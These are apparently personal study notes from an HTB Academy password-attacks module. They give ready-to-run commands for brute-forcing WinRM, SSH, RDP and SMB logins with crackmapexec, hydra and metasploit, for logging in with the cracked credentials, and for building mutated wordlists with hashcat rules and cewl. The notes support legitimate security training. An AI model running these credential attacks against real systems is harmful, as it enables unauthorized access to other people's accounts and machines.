## HTB-ACADEMY (Passsword attacks)
## Ivan Medina
---

### Remote attacks

##### Network services

- Winrm crack

```
crackmapexec winrm <ip> -u user.list -p password.list
```

```
evil-winrm -i <ip> -u user -p password
```

- SSH crack

```
hydra -t 4 -L user.list -P password.list <ip> ssh -v
```

- RDP crack

```
hydra -L user.list -P password.list <ip> rdp
```

```
xfreerdp /v:<ip> /u:<user> /p:<password>
```

- SMB crack with metasploit

```
use auxiliary/scanner/smb/smb_login
```

- SMB shares

```
crackmapexec smb <ip> -u "user" -p "password" --shares
```

- SMB client

```
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

##### Password mutations

*Password rules*

| Function   |      Description      |
|----------|:-------------:|
| : |	Do nothing. |
| l |	Lowercase all letters. |
| u |	Uppercase all letters. |
| c |	Capitalize the first letter and lowercase others. |
| sXY |	Replace all instances of X with Y. |
| $! |	Add the exclamation character at the end. |

*Generate wordlist with rules*

```
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

*Generate wordlist from webpage*

```
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

### Windows Local Password Attacks

...